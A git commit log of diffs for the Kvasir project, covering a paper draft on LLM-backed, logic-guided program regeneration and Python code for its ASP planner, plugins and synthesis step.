+functionality and satisfying new goals such as modularity, performance, or
+safety.
+While these transformations are conceptually simple, they are often
+brittle, time-consuming, and require deep expertise.
+% TODO: Introduce LLMs around here
+
+Existing tools help with narrow cases---transpilers translate syntax, linters
+enforce style, verifiers check correctness---but they fall short when
+transformations must preserve or alter semantic properties across diverse goals
+and program representations. 
+Worse, developers often lack precise ways to
+specify what should remain unchanged or what must be transformed.
+
+We present \sys, a system for scalable program regeneration.
+\sys allows users
+to express transformation goals declaratively, as logical constraints over
+program properties---such as input/output behavior, side-effect freedom, target
+language, trace equivalence, or modular structure. Given a source program and
+such a query, \sys extracts a minimal set of relevant properties, guided by a
+logic engine and a domain-specific knowledge base, and synthesizes a new
+program that satisfies the desired constraints.
+
+At the core of \sys is a property-guided synthesis pipeline: the system casts
+transformation as a constrained synthesis problem, minimizing extraction effort
+while ensuring semantic alignment. If no valid program exists under the given
+constraints, \sys provides informative failure explanations derived from
+logical conflict analysis.
+
+\sys is evaluated across a diverse set of transformation tasks, including:
+	Security hardening, by stripping latent malicious behavior while preserving intended functionality;
+	Cross-language translation, by regenerating semantically equivalent programs in new languages;
+	Idiomatic rewriting, by producing safer and more portable variants of legacy code;
+	Modular decomposition, by restructuring monolithic components into composable parts.
+  % TODO: Results?
+
+The paper's contributions are:
+\begin{itemize}
+ \item A declarative interface and accompanying DSL for program transformation, allowing users to express semantic goals as logical queries over properties of the regenerated program;
+ \item A property-aware transformation framework, combining logic-based reasoning, minimal extraction, and LLM-backed synthesis;
+ % TODO: Implementation of sys?
+\end{itemize}
+
+By coupling logic-driven reasoning with modern synthesis tools, \sys enables a new class of transformation workflows---ones that are expressive, verifiable, and adaptable across software tasks.
 
@@
   that wanted properties are preserved and unwanted properties are avoided.
-  \todo{Make this a real figure.}
 }
@@
 \begin{minted}[frame=lines]{haskell}
-flatMap :: (a -> b) -> [Either a [a]] -> [b]
-flatMap fn stream = concatMap fn stream
+flatmap :: (a -> b) -> NestedList a -> [b]
+flatmap f (Elem x) = [f x]
+flatmap f (List x) = concatMap (flatmap f) x
 \end{minted}
@@
 db('music.db').
-equal(io(P), io(P_)).
 equal(trace(P,sql),trace(P_,sql)).
@@
   \centering
-  \caption{Planning overhead: time taken by \sys’s logic engine to compute minimal property set.}
+  \caption{Planning overhead: time taken by \sys's logic engine to compute minimal property set.}
   \begin{tabular}{lcc}
@@
 
-These results support the claim that \sys’s planning logic---driven by explicit
+These results support the claim that \sys's planning logic---driven by explicit
 property extraction and knowledge-base reasoning---yields safer and more

### 2025-06-09 kvasir/cli.py
Make the LLM prompt better
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -30,10 +30,9 @@ def main(input, query, output, verbose):
     program = Program(entry=input)
     query = Query(entry=query)
     kb = KnowledgeBase()
-
-    logger.info(f"Loaded program: {program}")
+    logger.debug(f"Loaded program: {program}")
 
     program_ = transform(program, kb, query, plugins)
-    logger.info(f"Tranformed program {program} to {program_}")
+    logger.debug(f"Tranformed program {program} to {program_}")
 
     program_.save(output)

### 2025-06-09 kvasir/default_plugins/program_js.py

@@ -1,9 +1,10 @@
 from kvasir.hooks import hookimpl
-from kvasir.program import Program
+from kvasir.program import Program, Language
+from dataclasses import dataclass
 
 
 class JavaScriptProgram(Program):
-    language = "javascript"
+    language = Language.JS
 
     def load(self):
         """Load the JavaScript code from the entry file."""
@@ -13,7 +14,7 @@ class JavaScriptProgram(Program):
     def save(self, output):
         """Save the JavaScript code to the output file."""
         with open(output, "w") as file:
-            file.write(self.code)
+            file.write(self.src)
 
 
 @hookimpl

### 2025-06-09 kvasir/default_plugins/signature.py

@@ -3,35 +3,40 @@ import re
 from kvasir.logic import KnowledgeBase
 import kvasir.program
 from kvasir.hooks import hookimpl
+from kvasir.program import Property
 
+class Signature(Property):
+    """
+    Represents a function signature extracted from a program.
+    Contains the function name and its parameter list.
+    """
 
 @hookimpl
 def precondition(program):
     return program["language"] == kvasir.program.Language.JS
 
-
 @hookimpl
 def extract(program):
     # Extract top-level function signatures using regex (simplified)
     pattern = r"function\s+(\w+)\s*\(([^)]*)\)"
-    matches = re.findall(pattern, program.code)
+    matches = re.findall(pattern, program.src)
 
     # Store as a list of (name, args)
-    program["signatures"] = [
+    program["signatures"] = Property("signatures", [
         {"name": name, "args": [arg.strip() for arg in args.split(",") if arg.strip()]}
         for name, args in matches
-    ]
+    ]);
 
     return {"signatures"}
 
 
 @hookimpl
 def verify(original_program, regenerated_program):
-    orig_sigs = original_program["signatures"]
-    regen_sigs = regenerated_program["signatures"]
+    orig_sigs: Property = original_program["signatures"]
+    regen_sigs: Property = regenerated_program["signatures"]
 
     def normalize(sigs):
-        return sorted((sig["name"], tuple(sig["args"])) for sig in sigs)
+        return sorted((sig["name"], tuple(sig["args"])) for sig in sigs.value)
 
     return normalize(orig_sigs) == normalize(regen_sigs)
 

### 2025-06-09 kvasir/cli.py
Rename transform to regenerate
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -5,7 +5,7 @@ import click
 from .plugins import load_plugins
 from .program import Program
 from .query import Query
-from .synth import transform
+from .synth import regenerate
 from .utils import logger
 from .logic import KnowledgeBase
 
@@ -32,7 +32,7 @@ def main(input, query, output, verbose):
     kb = KnowledgeBase()
     logger.debug(f"Loaded program: {program}")
 
-    program_ = transform(program, kb, query, plugins)
+    program_ = regenerate(program, kb, query, plugins)
     logger.debug(f"Tranformed program {program} to {program_}")
 
     program_.save(output)

### 2025-06-09 kvasir/synth.py

@@ -34,7 +34,7 @@ class SynthesizeProgram(dspy.Module):
             regenerated_program.annotations = program.annotations.copy() # TODO: Do this better
             return regenerated_program
 
-def transform(program, kb, query, plugins) -> Program:
+def regenerate(program, kb, query, plugins) -> Program:
     for plugin in plugins:
         if hasattr(plugin, "extract"):
             logger.info(f"Extracting properties with {plugin.__name__}")

### 2025-06-09 kvasir/cli.py
Move query to logic
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -4,10 +4,9 @@ import click
 
 from .plugins import load_plugins
 from .program import Program
-from .query import Query
 from .synth import regenerate
 from .utils import logger
-from .logic import KnowledgeBase
+from .logic import KnowledgeBase, Query
 
 
 @click.command()

### 2025-06-09 kvasir/logic.py

@@ -3,6 +3,13 @@ from clingo import Control
 from .utils import logger
 from .program import Program
 
+class Query:
+    def __init__(self, entry: str):
+        with open(entry, "r") as file:
+            if not file.readable():
+                raise ValueError(f"Query file {entry} is not readable.")
+            self.query = file.read().strip()
+
 class KnowledgeBase:
     def __init__(self):
         self.ctl = Control([])

### 2025-06-09 kvasir/query.py

@@ -1,3 +1,0 @@
-class Query:
-    def __init__(self, entry):
-        pass

### 2025-06-09 kvasir/default_plugins/signature.py
Change transform to apply
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -16,24 +16,24 @@ def precondition(program):
     return program["language"] == kvasir.program.Language.JS
 
 @hookimpl
-def extract(program):
+def apply(program):
     # Extract top-level function signatures using regex (simplified)
     pattern = r"function\s+(\w+)\s*\(([^)]*)\)"
     matches = re.findall(pattern, program.src)
 
     # Store as a list of (name, args)
-    program["signatures"] = Property("signatures", [
+    program["signature"] = Property("signature", [
         {"name": name, "args": [arg.strip() for arg in args.split(",") if arg.strip()]}
         for name, args in matches
     ]);
 
-    return {"signatures"}
+    return {"signature"}
 
 
 @hookimpl
 def verify(original_program, regenerated_program):
-    orig_sigs: Property = original_program["signatures"]
-    regen_sigs: Property = regenerated_program["signatures"]
+    orig_sigs: Property = original_program["signature"]
+    regen_sigs: Property = regenerated_program["signature"]
 
     def normalize(sigs):
         return sorted((sig["name"], tuple(sig["args"])) for sig in sigs.value)
@@ -41,5 +41,5 @@ def verify(original_program, regenerated_program):
     return normalize(orig_sigs) == normalize(regen_sigs)
 
 @hookimpl
-def knowledge(kb: KnowledgeBase, program):
+def knowledge(kb, program):
     kb.add_logic("can(signature(p)).") 

### 2025-06-09 kvasir/hooks.py

@@ -5,12 +5,13 @@ hookimpl = HookimplMarker("kvasir")
 
 
 @hookspec
-def extract(program):
+def apply(program):
     """
-    Extract a property from the program.
+    Apply the plugin to the program.
+    This can either extract a property from the program or modify it in some way.
 
-    Should mutate or annotate the program object (e.g., program.signatures = ...).
-    Returns set of extracted properties
+    This should mutate or annotate the program object (e.g., program.signatures = ...).
+    Returns set of extracted/modified properties.
     """
 
 
@@ -30,7 +31,6 @@ def knowledge(kb, program):
 
     Accepts a KnowledgeBase object and may mutate it (e.g., kb.add_rule(...)).
     """
-
 
 @hookspec
 def language_support():

### 2025-06-09 kvasir/synth.py

@@ -15,7 +15,9 @@ lm = dspy.LM('openai/gpt-4o-mini')
 dspy.configure(lm=lm)
 
 class RegenerateProgram(dspy.Signature):
-    """LLM signature for program regeneration."""
+    """
+    You should synthesize the program's source code while preserving the properties that are marked as to be preserved.
+    """
     input_program: str  = dspy.InputField(desc="Input program to be regenerated.")
     output_program: str = dspy.OutputField(desc="Source code of the regenerated program.")
 
@@ -35,22 +37,26 @@ class SynthesizeProgram(dspy.Module):
             return regenerated_program
 
 def regenerate(program, kb, query, plugins) -> Program:
+    kb.add_logic(program.to_logic())
     for plugin in plugins:
-        if hasattr(plugin, "extract"):
-            logger.info(f"Extracting properties with {plugin.__name__}")
-            plugin.extract(program)
-
         if hasattr(plugin, "knowledge"):
             logger.info(f"Adding knowledge with {plugin.__name__}")
             plugin.knowledge(kb, program)
 
     plan = logic.plan(kb, query, program)
+    logger.info(f"Generated plan: {plan}")
+
+    for plugin in plugins:
+        logger.info(f"Trying to apply {plugin.__name__} to the program {program}")
+        if hasattr(plugin, "apply") and plan.does(plugin.__name__):
+            logger.info(f"Applying {plugin.__name__}")
+            plugin.apply(program)
+
     program_ = synthesize(program, plan)
 
     for plugin in plugins:
-        logger.info(f"Verifying {program_} against {program} with {plugin.__name__}")
-
-        if hasattr(plugin, "verify"):
+        if hasattr(plugin, "verify") and plan.does(plugin.__name__):
+            logger.info(f"Verifying {program_} against {program} with {plugin.__name__}")
             plugin.verify(program, program_)
 
     return program_
@@ -63,6 +69,6 @@ def synthesize(program, plan) -> Program:
     synthesize = SynthesizeProgram()
     regenerated_program = synthesize(program)
     if logger.level == logging.DEBUG:
-        dspy.inspect_history(10)
+        dspy.inspect_history()
     
     return regenerated_program

### 2025-06-09 kvasir/program.py
Add to_logic for program
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -81,10 +81,15 @@ class Program(metaclass=ProgramMeta):
     def to_lm(self) -> str:
         """Convert the program to a string representation for a language model."""
         repr = ""
+        repr += f"The program is written in {self.language}.\n"
         for name, prop in self.annotations.items():
             repr += prop.to_lm()
 
         return repr
+
+    def to_logic(self) -> str:
+        """Convert the program to a logic representation."""
+        return f"language(p, {self.language.value})."
 
     def load(self) -> str:
         """Load the program src from the entry file."""

### 2025-06-09 kvasir/logic.py
Improve logic and plan
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -15,30 +15,34 @@ class KnowledgeBase:
         self.ctl = Control([])
         self.program = ""
 
-    def solve(self, query: str):
+    def solve(self, query: Query):
+        """Solve the query using the knowledge base."""
         results = []
 
-        # self.add_logic(query)
+        logger.debug(f"Solving query: {query.query}")
+        logger.debug(f"Using program:\n{self.program}")
+
+        self.add_logic(query.query)
 
         self.ctl.add("base", [], self.program)
         self.ctl.ground([("base", [])])
 
         def on_model(model):
-            atoms = [str(atom) for atom in model.symbols(shown=True)]
-            results.append(atoms)
+            for atom in model.symbols(shown=True):
+                if atom.match("do", 1):
+                    results.append(atom.arguments[0].name)
 
         with self.ctl.solve(yield_=True) as handle:
             for model in handle:
                 on_model(model)
-                logger.debug(f"Model: {model}")
 
+        logger.debug(f"Solved query: {query.query} with results: {results}")
         return results
 
-    def add_logic(self, logic: str):
-        self.program += logic + "\n"
+    def add_logic(self, logic: str, comment: str=""):
+        self.program += logic + " " + (f"% {comment}" if comment else "") + '\n'
 
-def run_engine(kb: KnowledgeBase, query: str, program: Program):
-
+def run_engine(kb: KnowledgeBase, query: Query, program: Program) -> Dict[str, Any]:
     code = (
         """
 do(X) :- goal(X).
@@ -56,11 +60,11 @@ ndo(N) :- N = #count { X : do(X) }.
 
     kb.add_logic(code)
 
-    return kb.solve(query)
+    return { k: True for k in kb.solve(query)}
 
 class Plan:
-    def __init__(self, extracted_properties):
-        self.properties: Dict[str, Any] = extracted_properties  # Dict[str, Any]
+    def __init__(self, properties: Dict[str, Any]):
+        self.properties: Dict[str, Any] = properties
         self.history = []  # e.g., list of prior generations / decisions
 
     def reconfigure(self, new_info) -> "Plan":
@@ -68,11 +72,21 @@ class Plan:
         self.history.append(new_info)
         # Optionally mutate `self.properties` or add constraints
         return self
+    
+    def does(self, property_name: str) -> bool:
+        """Check if the plan includes actions for the given plugin."""
+        # Handle module names
+        if "." in property_name:
+            property_name = property_name.split(".")[-1]
[…]

### 2025-06-09 kvasir/default_plugins/js2hs.py
Add js2hs plugin
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -1,0 +1,28 @@
+from kvasir.hooks import hookimpl
+from kvasir.program import Program, Language
+
+
+@hookimpl
+def apply(program):
+    pass
+
+@hookimpl
+def knowledge(kb, program):
+    """
+    Add domain-specific rules or constraints to the logic engine's knowledge base.
+    This is a placeholder function for demonstration purposes.
+    """
+    kb.add_logic("can(js2hs(p)).", "This program can be transformed from JavaScript to Haskell.")
+    kb.add_logic("do(js2hs(p)) :- do(language(p, haskell)).")
+    kb.add_logic(":- do(js2hs(p)), not language(p, javascript).")
+
+# This plugin can define its own plugin manager to allow transformation of other properties
+# For now, we will implement IO translation from JavaScript to Haskell
+
+def js2hs_io(io):
+    """
+    Convert JavaScript I/O operations to Haskell equivalents.
+    This is a placeholder function for demonstration purposes.
+    """
+    input, output = io
+    return io

### 2025-06-09 kvasir/logic.py
Improve logic
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -19,25 +19,25 @@ class KnowledgeBase:
         """Solve the query using the knowledge base."""
         results = []
 
-        logger.debug(f"Solving query: {query.query}")
-        logger.debug(f"Using program:\n{self.program}")
-
         self.add_logic(query.query)
+
+        logger.debug(f"Using program:\n{self.program}")
 
         self.ctl.add("base", [], self.program)
         self.ctl.ground([("base", [])])
 
         def on_model(model):
+            r = []
             for atom in model.symbols(shown=True):
                 if atom.match("do", 1):
-                    results.append(atom.arguments[0].name)
+                    r.append(atom.arguments[0].name)
+            results.append(r)
 
         with self.ctl.solve(yield_=True) as handle:
             for model in handle:
                 on_model(model)
 
-        logger.debug(f"Solved query: {query.query} with results: {results}")
-        return results
+        return results[-1]
 
     def add_logic(self, logic: str, comment: str=""):
         self.program += logic + " " + (f"% {comment}" if comment else "") + '\n'
@@ -53,6 +53,8 @@ ndo(N) :- N = #count { X : do(X) }.
 #maximize { N : ndo(N) }.
 
 :- goal(X), not do(X).
+
+:- do(language(P, L1)), do(language(P, L2)), L1 != L2. % A program has one language.
 
 #show do/1.
         """

### 2025-06-09 kvasir/default_plugins/signature.py
Remove precondition
This should probably be handled from inside the logic engine

Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -12,10 +12,6 @@ class Signature(Property):
     """
 
 @hookimpl
-def precondition(program):
-    return program["language"] == kvasir.program.Language.JS
-
-@hookimpl
 def apply(program):
     # Extract top-level function signatures using regex (simplified)
     pattern = r"function\s+(\w+)\s*\(([^)]*)\)"

### 2025-06-09 kvasir/default_plugins/js2hs.py
Fix js2hs
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -4,7 +4,7 @@ from kvasir.program import Program, Language
 
 @hookimpl
 def apply(program):
-    pass
+    program.language = Language.HS
 
 @hookimpl
 def knowledge(kb, program):
@@ -13,7 +13,7 @@ def knowledge(kb, program):
     This is a placeholder function for demonstration purposes.
     """
     kb.add_logic("can(js2hs(p)).", "This program can be transformed from JavaScript to Haskell.")
-    kb.add_logic("do(js2hs(p)) :- do(language(p, haskell)).")
+    kb.add_logic("do(language(p, haskell)) :- do(js2hs(p)).")
     kb.add_logic(":- do(js2hs(p)), not language(p, javascript).")
 
 # This plugin can define its own plugin manager to allow transformation of other properties

### 2025-06-09 kvasir/default_plugins/program_js.py
Remove language support
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -1,22 +1,0 @@
-from kvasir.hooks import hookimpl
-from kvasir.program import Program, Language
-from dataclasses import dataclass
-
-
-class JavaScriptProgram(Program):
-    language = Language.JS
-
-    def load(self):
-        """Load the JavaScript code from the entry file."""
-        with open(self.entry, "r") as file:
-            return file.read()
-
-    def save(self, output):
-        """Save the JavaScript code to the output file."""
-        with open(output, "w") as file:
-            file.write(self.src)
-
-
-@hookimpl
-def language_support():
-    return JavaScriptProgram

### 2025-06-09 kvasir/hooks.py

@@ -31,9 +31,3 @@ def knowledge(kb, program):
 
     Accepts a KnowledgeBase object and may mutate it (e.g., kb.add_rule(...)).
     """
-
-@hookspec
-def language_support():
-    """
-    Return the program subclass that this plugin supports.
-    """

### 2025-06-09 kvasir/plugins.py

@@ -21,10 +21,4 @@ def load_plugins():
     # Load external plugins
     pm.load_setuptools_entrypoints("kvasir")
 
-    # Register program subclasses from plugins
-    for impl in pm.hook.language_support():
-        assert impl, "Plugin must return a program subclass"
-        lang = impl.language
-        program.ProgramMeta.registry[lang] = impl
-
     return pm.get_plugins()

### 2025-06-09 kvasir/cli.py
Make end-to-end py to hs work
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -34,4 +34,5 @@ def main(input, query, output, verbose):
     program_ = regenerate(program, kb, query, plugins)
     logger.debug(f"Tranformed program {program} to {program_}")
 
+    program_.entry = output
     program_.save(output)

### 2025-06-09 kvasir/program.py

@@ -1,7 +1,7 @@
 from dataclasses import dataclass
 from enum import Enum
 from pathlib import Path
-from typing import Any
+from typing import Any, Type
 
 from .utils import logger
 
@@ -55,13 +55,13 @@ It should {'not' if not self.tobe_preserved else ''} be preserved during regener
         return f"{self.name}: {self.value}"
 
 class ProgramMeta(type):
-    registry: dict[Language, "Program"] = {}
+    registry: dict[Language, Type["Program"]] = {}
 
     def __call__(cls, entry, *args, **kwargs):
         lang = detect_language(entry)
         subclass = cls.registry.get(lang, cls)
         logger.info(
-            f"Detected language: {lang}, using subclass: {subclass.__name__} from {cls.registry}"
+            f"Detected language: {lang}, using subclass: {subclass.__name__}"
         )
         return super(ProgramMeta, subclass).__call__(entry, *args, **kwargs)
 
@@ -77,6 +77,7 @@ class Program(metaclass=ProgramMeta):
         self.entry = Path(entry)
         self.annotations = {}
         self.src = self.load()
+        assert self.src, f"Failed to load program source from {self.entry}"
 
     def to_lm(self) -> str:
         """Convert the program to a string representation for a language model."""
@@ -92,9 +93,10 @@ class Program(metaclass=ProgramMeta):
         return f"language(p, {self.language.value})."
 
     def load(self) -> str:
+        logger.debug(f"Loading program from {self.entry}")
         """Load the program src from the entry file."""
         with open(self.entry, "r") as file:
-            return file.read()
+            return file.read().strip()
 
     def save(self, output):
         """Save the program src to the output file."""
@@ -106,3 +108,15 @@ class Program(metaclass=ProgramMeta):
 
     def __getitem__(self, key):
         return self.annotations.get(key, None)
+
+
+# Language-specific programs
+class JavaScriptProgram(Program):
+    language = Language.JS
+
+class HaskellProgram(Program):
+    language = Language.HS
+
+# Register the language-specific programs
+ProgramMeta.registry[Language.JS] = JavaScriptProgram
+ProgramMeta.registry[Language.HS] = HaskellProgram

### 2025-06-09 kvasir/synth.py

@@ -5,9 +5,10 @@ import dspy
 import tempfile
 
 import kvasir.logic as logic
+from kvasir.logic import Query
 from kvasir.program import Program
 
-from .utils import logger
+from .utils import logger, clean_llm_output
 
 dotenv.load_dotenv()
 
@@ -28,13 +29,16 @@ class SynthesizeProgram(dspy.Module):
     def forward(self, program: Program) -> Program:
         """Regenerate the program's source code based on the context provided."""
         regenerated_program_src = self.synthesize(input_program=program.to_lm()).output_program
+        regenerated_program_src = clean_llm_output(regenerated_program_src)
+        logger.debug(f"Regenerated program source code: {regenerated_program_src}")
 
-        with tempfile.NamedTemporaryFile(delete=False, suffix=program.language.suffix()) as temp_file:
-            temp_file.write(regenerated_program_src.encode('utf-8'))
-            temp_file_path = temp_file.name
-            regenerated_program = Program(entry=temp_file_path)
-            regenerated_program.annotations = program.annotations.copy() # TODO: Do this better
-            return regenerated_program
+        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix=program.language.suffix()) as file:
+            logger.info(f"Writing regenerated program to {file.name}")
+            file.write(regenerated_program_src)
+            file_path = file.name
+        regenerated_program = Program(entry=file_path)
+        regenerated_program.annotations = program.annotations.copy() # TODO: Do this better
+        return regenerated_program
 
 def regenerate(program, kb, query, plugins) -> Program:
     kb.add_logic(program.to_logic())

### 2025-06-09 kvasir/utils.py

@@ -15,5 +15,13 @@ formatter = logging.Formatter(
 handler.setFormatter(formatter)
 logger.addHandler(handler)
 
+def clean_llm_output(text: str) -> str:
+    lines = text.splitlines()
+    if lines and lines[0].lstrip().startswith("```"):
+        lines = lines[1:]
+    if lines and lines[-1].lstrip().startswith("```"):
+        lines = lines[:-1]
+    return "\n".join(lines)
+
 # Disable by default
 logger.setLevel(logging.CRITICAL + 1)

### 2025-06-10 paper/draft.tex
Add notes to draft
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>
Refine evaluation goals
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 
+% Mention that:
+% 1. They have shown great promise in program synthesis + 
+% 2. They can not do negative reasoning well - 
+% 3. Their output are often closely aligned to their inputs. They are gullible (susceptible to adversarial inputs). -
+% 4. Difficult to verify correctness of outputs against certain properties. The
+%    user cannot easily set requirements or say output should be within a range of
+%    acceptance
+
 Existing tools help with narrow cases---transpilers translate syntax, linters
@@
 
-We present \sys, a system for scalable program regeneration.
+This paper present \sys, a system for scalable program regeneration.
 \sys allows users
@@
   Rosetta Code                                          & Programming tasks              & 5 & \cite{rosettacode} \\
-  npm utilities                                           & Utilities from npm             & 20 & \cite{regbench2025} \\
-Python utilities                                        & Utilities from PyPi            & 20 & \cite{regbench2025} \\
+  npm utilities                                           & Utilities from npm             & 10 & \cite{regbench2025} \\
+Python utilities                                        & Utilities from PyPi            & 1 & \cite{regbench2025} \\
   SSCA                                                    & Sneaky SSAs    & 3 & \cite{ev:eurosec:2022, es1, ohm2020backstabber} \\

### 2025-06-10 paper/draft.tex
Refine intro
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 Modern software systems are in constant flux.
-Developers refactor legacy code,
-adapt libraries to evolving APIs, translate modules across programming
-languages, and harden components against emerging security threats.
-Each transformation demands a careful balance between preserving intended
-functionality and satisfying new goals such as modularity, performance, or
-safety.
-While these transformations are conceptually simple, they are often
-brittle, time-consuming, and require deep expertise.
+Developers refactor legacy code~\cite{Fowler99,Mens04},
+adapt libraries to evolving APIs,
+translate modules across programming languages,
+and harden components against emerging security threats.
+These transformations are brittle, time-consuming, and may require deep expertise,
+even if the can be conceptually simple.
 % TODO: Introduce LLMs around here
+
+Existing tools help with narrow cases---transpilers translate syntax, linters
+enforce style, verifiers check correctness---but they fall short when
+transformations must preserve or alter semantic properties across diverse goals
+and program representations. 
+Worse, developers often lack precise ways to
+specify what should remain unchanged or what must be transformed.
+
+Recent advances in large language models (LLMs) have shown great promise in
+program synthesis and transformation tasks.
+Yet LLMs suffer from several well-documented limitations:
+they struggle with negative reasoning or the proof of absence properties, their outputs often over-align with input patterns—making
+them vulnerable to adversarial or malformed prompts, and it
+remains difficult to enforce rich semantic or domain-specific constraints on
+generated code.
+As a result, while LLM-backed tools can
+accelerate prototyping, developers still lack reliable ways to verify or steer
+their transformations to meet precise correctness or security requirements.
 
@@
 
-Existing tools help with narrow cases---transpilers translate syntax, linters
-enforce style, verifiers check correctness---but they fall short when
-transformations must preserve or alter semantic properties across diverse goals
-and program representations. 
-Worse, developers often lack precise ways to
-specify what should remain unchanged or what must be transformed.
-
-This paper present \sys, a system for scalable program regeneration.
+This paper present \sys, a system for \emph{scalable program regeneration}.
 \sys allows users
@@
  \item A declarative interface and accompanying DSL for program transformation, allowing users to express semantic goals as logical queries over properties of the regenerated program;
- \item A property-aware transformation framework, combining logic-based reasoning, minimal extraction, and LLM-backed synthesis;
- % TODO: Implementation of sys?
+ \item A property-aware transformation framework, combining logic-based reasoning, and LLM-backed synthesis;
+ \item An empirical evaluation demonstrating \sys’s effectiveness and scalability across transformation scenarios.
 \end{itemize}
 
-By coupling logic-driven reasoning with modern synthesis tools, \sys enables a new class of transformation workflows---ones that are expressive, verifiable, and adaptable across software tasks.
+By coupling logic-driven reasoning with modern synthesis tools, \sys enables a
+new class of transformation workflows---ones that are expressive, to some extent verifiable,
+and adaptable across software tasks.
 

### 2025-06-10 paper/draft.tex
Add first version of related work
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 
+\section{Related Work}
+
+\heading{Program Synthesis}
+Program synthesis research spans a rich space of techniques.
+Classical techniques emphasize correctness and
+interpretability, synthesizing programs from specifications~\cite{alur2013syntax, feser2015synthesizing, gulwani2011automating},
+type constraints \cite{polikarpova2016program},
+or examples \cite{jha2010oracle, raza2018disjunctive, singh2016blinkfill}.
+These works often target narrowly
+defined domains such as string manipulation~\cite{harp:ccs:2021} or data migration
+\cite{yaghmazadeh2018automated} and focus on ensuring provable guarantees.
+More recently, LLM-based methods~\cite{austin2021program, chen2021evaluating}
+explore broad-domain code generation via prompt-based conditioning.
+While remarkably flexible, these models are prone to hallucination and struggle
+with reasoning under negation or satisfying structured constraints~\cite{xu2023llmfoolitselfpromptbased, wu2023deceptpromptexploitingllmdrivencode,jiang2024llmsdreamelephantswhen,hwang2024thinkpinkelephant}.
+
+\sys leverages insights from both these paradigms.
+Unlike purely symbolic or purely neural approaches, it leverages LLMs within a
+constrained planning framework to guide transformations while remaining
+responsive to property-based requirements. This hybrid design aims to combine
+the expressiveness of LLMs with the controllability and robustness of symbolic
+reasoning. % TODO: focus on that \sys focuses on this specific problem domain
+
+\heading{Program Transformations and Refactoring}
+The evolution and maintenance of software systems often involve transformations
+such as refactoring, translation, or security hardening. Foundational work on
+refactoring~\cite{Fowler99} and its taxonomy~\cite{Mens04} characterizes the
+space of behavior-preserving modifications. More recent perspectives emphasize
+developer experience and usability, particularly in the context of APIs~\cite{Myers16}.
+
+Tools in this space have largely operated via syntax-tree transformations or
+domain-specific templates. Verification-based methods such as \textsc{Dafny}
+\cite{Leino10} and \textsc{CBMC} \cite{Clarke04} ensure functional correctness
+but require heavy formalization.
+Others automate migration via
+programming-by-example or interactive guidance \cite{gulwani2017program, le2017interactive}.
+
+Kvasir aims to generalize this landscape by treating transformations as
+goal-directed regenerations—rather than prescriptive rewrites, driven by
+properties such as program behaviors and architectural goals, expressed declaratively.
+
+\heading{Logic Programming and Constraint Solving}
+Logic programming has long served as a foundation for reasoning in programming
+tools, offering a declarative model for expressing properties and constraints.
+Answer Set Programming (ASP), in particular, provides a rich framework for
+expressing defaults, exceptions, and optimization via stable model semantics
+\cite{Gelfond_2000, Gelfond_2002, Eiter_2009}. ASP has been used for
+declarative program analysis \cite{benton2007interactive}, automated planning
+\cite{nguyen2020explainable, son2022answersetplanningsurvey}, and knowledge
+representation in verification and synthesis pipelines.
+
+\sys uses ASP as its planning back-end for the planning, decision-making
+process, while also uses its straighftorward optimization capabilities.
+For each transformation task, \sys formulates the property-satisfaction problem as a logic query and uses an ASP solver to
+synthesize a feasible transformation plans.
+This enables global reasoning across program components and enforces
+user-specified constraints that are difficult for neural models to respect.
+In addition, it offers a level of explainability that is useful in case transformations end up incorrect.
+
 \bibliographystyle{ACM-Reference-Format}

### 2025-06-10 paper/draft.tex
Add technical sections
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 Yet LLMs suffer from several well-documented limitations:
-they struggle with negative reasoning or the proof of absence properties, their outputs often over-align with input patterns—making
+they struggle with negative reasoning or the proof of absence properties, their outputs often over-align with input patterns---making
 them vulnerable to adversarial or malformed prompts, and it
@@
 
-\section{Component Interface}
+\section{\sys Design}
 
-\sys adaptor, logic engine, and verifier components
-are designed to be extensible.
-These can be written in the form of plugins.
-Adding a new to-be-preserved (or avoided) property involves 
-creating a new adaptor function that extracts that property from the given 
-program together with the logical pre-conditions that need to hold 
-for it to be extractable, and a new verifier function that checks whether the
-property is preserved in the regenerated program or \say{unknown}.
-Each part of the plugin can produce logical atoms or rules which are fed to the \sys 
-logical engine and can influence the regeneration process.
+\sys is a system for program regeneration: given an input program and a set of
+behavioral, structural, or syntactic properties, it synthesizes a new program
+that satisfies a specified subset of those properties. The system treats
+regeneration as a goal-driven process, guided by explicit property
+specifications and a symbolic planner that structures the search space for a
+backend synthesizer.
+At a high level, \sys operates in four phases: (1) property extraction, (2)
+plan construction, (3) program synthesis, and (4) verification. These phases
+interact through a shared representation of the program and its transformation
+goals.
+
+\heading{Property Extraction} \sys begins by analyzing the input program to
+extract a collection of properties. These may describe the program’s interface
+(\eg, exported functions), its operational constraints (\eg, disallowing
+filesystem access), or its structure (\eg, use of a particular API or
+programming idiom). While some properties are derived from generic analyses
+applicable across languages, others are tailored to the specifics of the input
+program’s language and runtime model.
+
+\heading{Plan Construction} The extracted properties, together with
+user-provided regeneration goals, are passed to a planning component. The
+planner constructs a transformation plan that specifies which properties must
+be preserved, which may be relaxed, and what target conditions must be achieved
+in the output program. This plan captures a symbolic view of the regeneration
+task and constrains the synthesis phase accordingly.
+
+\heading{Synthesis} Guided by the transformation plan, \sys synthesizes a
+candidate program intended to satisfy the specified constraints. Synthesis is
+treated as a generative process constrained by the plan’s logic---only programs
+that respect the specified properties and behavioral goals are considered valid
+candidates. This phase can incorporate both local and global reasoning about
+the structure and semantics of the output.
